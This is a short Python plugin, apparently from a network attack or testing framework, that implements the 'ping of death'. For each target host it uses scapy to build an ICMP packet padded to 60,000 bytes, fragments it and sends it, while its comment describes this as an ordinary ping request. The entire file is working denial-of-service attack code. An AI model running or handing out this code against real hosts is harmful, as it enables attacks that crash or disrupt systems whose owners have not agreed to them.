
from __future__ import print_function
from plugins.PluginAPI import PluginAPI

from scapy.all import IP, ICMP, fragment
import netaddr


class ping_of_the_death(PluginAPI):

    def __init__(self):
        PluginAPI.__init__(self)

    def run(self, hosts):


        # Send ICMP ping request, wait for answer
        for host in hosts:
            packet = fragment(IP(dst=str(host)) / ICMP()/("X"*60000))
            resp = self.send_receive(packet, timeout=2, verbose=0)



